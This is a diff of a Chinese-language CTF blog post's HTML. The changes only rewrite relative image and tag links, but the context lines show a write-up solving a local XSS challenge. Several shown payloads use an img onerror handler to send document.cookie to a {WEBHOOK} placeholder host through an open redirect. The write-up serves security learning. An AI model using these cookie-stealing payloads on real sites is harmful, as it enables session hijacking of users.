@@ -12,7 +12,7 @@
     <link rel="stylesheet" href='https://lyccyc.github.io/penguin.cyc/css/syntax.css' />
     <title>CTF_xxs-xss - Penguin&#39;s blog</title>
     
-    <link rel="icon" type="image/x-icon" href='../../images/favicon.ico'>
+    <link rel="icon" type="image/x-icon" href='/images/favicon.ico'>
     
     <meta name="theme-color" content="#1e2327">
 
@@ -141,7 +141,7 @@
               <div class="d-none d-md-block">
                 <a class="avatar mr-2 flex-shrink-0" href="https://lyccyc.github.io/penguin.cyc/">
                   <img class=" avatar-user"
-                    src="../../images/penguin.png"
+                    src="/images/penguin.png"
                     width="32" height="32"></a>
               </div>
               <div class="d-flex flex-column">
@@ -195,7 +195,7 @@
                   <div class="file-actions flex-order-2 pt-0">
                     
                     
-                    <a class="muted-link mr-3" href="../../tags/ctf">
+                    <a class="muted-link mr-3" href="/tags/ctf">
                       <svg class="octicon octicon-tag" viewBox="0 0 16 16" version="1.1" width="16" height="16">
                         <path fill-rule="evenodd"
                           d="M2.5 7.775V2.75a.25.25 0 01.25-.25h5.025a.25.25 0 01.177.073l6.25 6.25a.25.25 0 010 .354l-5.025 5.025a.25.25 0 01-.354 0l-6.25-6.25a.25.25 0 01-.073-.177zm-1.5 0V2.75C1 1.784 1.784 1 2.75 1h5.025c.464 0 .91.184 1.238.513l6.25 6.25a1.75 1.75 0 010 2.474l-5.026 5.026a1.75 1.75 0 01-2.474 0l-6.25-6.25A1.75 1.75 0 011 7.775zM6 5a1 1 0 100 2 1 1 0 000-2z">
@@ -204,7 +204,7 @@
                       CTF
                     </a>
                     
-                    <a class="muted-link mr-3" href="../../tags/website">
+                    <a class="muted-link mr-3" href="/tags/website">
                       <svg class="octicon octicon-tag" viewBox="0 0 16 16" version="1.1" width="16" height="16">
                         <path fill-rule="evenodd"
                           d="M2.5 7.775V2.75a.25.25 0 01.25-.25h5.025a.25.25 0 01.177.073l6.25 6.25a.25.25 0 010 .354l-5.025 5.025a.25.25 0 01-.354 0l-6.25-6.25a.25.25 0 01-.073-.177zm-1.5 0V2.75C1 1.784 1.784 1 2.75 1h5.025c.464 0 .91.184 1.238.513l6.25 6.25a1.75 1.75 0 010 2.474l-5.026 5.026a1.75 1.75 0 01-2.474 0l-6.25-6.25A1.75 1.75 0 011 7.775zM6 5a1 1 0 100 2 1 1 0 000-2z">
@@ -213,7 +213,7 @@
                       Website
                     </a>
                     
-                    <a class="muted-link mr-3" href="../../tags/docker">
+                    <a class="muted-link mr-3" href="/tags/docker">
                       <svg class="octicon octicon-tag" viewBox="0 0 16 16" version="1.1" width="16" height="16">
                         <path fill-rule="evenodd"
                           d="M2.5 7.775V2.75a.25.25 0 01.25-.25h5.025a.25.25 0 01.177.073l6.25 6.25a.25.25 0 010 .354l-5.025 5.025a.25.25 0 01-.354 0l-6.25-6.25a.25.25 0 01-.073-.177zm-1.5 0V2.75C1 1.784 1.784 1 2.75 1h5.025c.464 0 .91.184 1.238.513l6.25 6.25a1.75 1.75 0 010 2.474l-5.026 5.026a1.75 1.75 0 01-2.474 0l-6.25-6.25A1.75 1.75 0 011 7.775zM6 5a1 1 0 100 2 1 1 0 000-2z">
@@ -236,7 +236,7 @@
 <h2 id="description">Description</h2>
 <p>用 Docker 架起來後連線到 http://localhost:21337/</p>
 <p>頁面顯示如下</p>
-<p><img src="../../images/xxs-xss-guest.png" alt="xxs-xss-guest"></p>
+<p><img src="/images/xxs-xss-guest.png" alt="xxs-xss-guest"></p>
 <p>hmmm，甚麼都沒有</p>
 <h2 id="solution">Solution</h2>
 <p>根據題目給的 source code，先去觀察 <code>app.py</code></p>
@@ -367,7 +367,7 @@
 <hr>
 <p>好了，知道整個頁面怎麼運作了，剩下就是如何打出 xss</p>
 <p>在 <a href="https://blog.huli.tw/2021/09/26/what-is-open-redirect/">在做跳轉功能時應該注意的問題：Open Redirect</a> 這篇文章中看到一個重點 :</p>
-<p><img src="../../images/xxs-xss-redirection.png" alt="xxs-xss-redirection"></p>
+<p><img src="/images/xxs-xss-redirection.png" alt="xxs-xss-redirection"></p>
 <p>在 <code>index.html</code> 程式碼的第四行 :
 <code>const params = new URLSearchParams(window.location.search);</code></p>
 <h4 id="建構-payload-點-1">建構 payload 點-1</h4>
@@ -389,21 +389,21 @@
 <p>first_payload =
 <code>&lt;img src=x onerror='location.href=\&quot;{WEBHOOK}/?flag=\&quot;+btoa(document.cookie)'&gt;&amp;url=http://localhost:5000/?url=javascript:name</code></p>
 <p>將這個 payload 透過腳本串接，結果如下圖 :
-<img src="../../images/xxs-xss-payload-1.png" alt="xxs-xss-payload-1"></p>
+<img src="/images/xxs-xss-payload-1.png" alt="xxs-xss-payload-1"></p>
 <p>欸可是?沒連到外網?</p>
 <p>去看了 container 的 config :
-<img src="../../images/xxs-xss-config-1.png" alt="xxs-xss-config-1"></p>
+<img src="/images/xxs-xss-config-1.png" alt="xxs-xss-config-1"></p>
 <p>在這裡卡很久，一直覺得 url 長度剛好 15 沒超過，為甚麼沒有觸發到 name 的部分??</p>
 <p>於是開始了排列組合遊戲 (好玩愛玩下次不玩了QQ)</p>
 <p>second_payload =
 <code>url=http://localhost:5000/?url=javascript:name&amp;name=&lt;img src=x onerror='location.href=\&quot;{WEBHOOK}/?flag=\&quot;+btoa(document.cookie)'&gt;</code></p>
 <p>在經過腳本串接後，得到一樣的回應 和 config :
-<img src="../../images/xxs-xss-payload-2.png" alt="xxs-xss-payload-2">
-<img src="../../images/xxs-xss-config-2.png" alt="xxs-xss-config-2"></p>
+<img src="/images/xxs-xss-payload-2.png" alt="xxs-xss-payload-2">
+<img src="/images/xxs-xss-config-2.png" alt="xxs-xss-config-2"></p>
 <p>還是沒連到外網</p>
 <p>在這裡卡了好多天，程式碼看到睡覺還會夢到，超可怕</p>
 <p>最後有幸得到高人指點迷津 :</p>
-<p><img src="../../images/xxs-xss-hint.png" alt="xxs-xss-hint"></p>
+<p><img src="/images/xxs-xss-hint.png" alt="xxs-xss-hint"></p>
 <p><del>很明顯我的排列組合遊戲根本沒有好好玩過一遍</del></p>
 <p>再看一次程式碼，尤其是 <code>app.py</code> 的<code>visit()</code> 函式</p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">visit</span><span class="p">():</span>
@@ -467,10 +467,10 @@
 </span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s2">&#34;__main__&#34;</span><span class="p">:</span>
 </span></span><span class="line"><span class="cl">    <span class="n">main</span><span class="p">()</span>
 </span></span></code></pre></div></details>
-<p><img src="../../images/xxs-xss-config-3.png" alt="xxs-xss-config-3"></p>
+<p><img src="/images/xxs-xss-config-3.png" alt="xxs-xss-config-3"></p>
 <p>成功訪問外網啦(歡呼~)</p>
 <p>去外網找 flag</p>
-<p><img src="../../images/xxs-xss-webhook.png" alt="xxs-xss-webhook"></p>
+<p><img src="/images/xxs-xss-webhook.png" alt="xxs-xss-webhook"></p>
 <p>得到一串 base64，解碼就得到 flag 了</p>
 <p>最終訪問的 payload :
 <code>url=http%3A//localhost%3A5000/%3Fname%3D%253Cimg%2520src%253Dx%2520onerror%253D%2527location.href%253D%2522{WEBHOOK}/%253Fflag%253D%2522%252Bbtoa%2528document.cookie%2529%2527%253E%26url%3Djavascript%3Aname&amp;nonce=18235395</code></p>
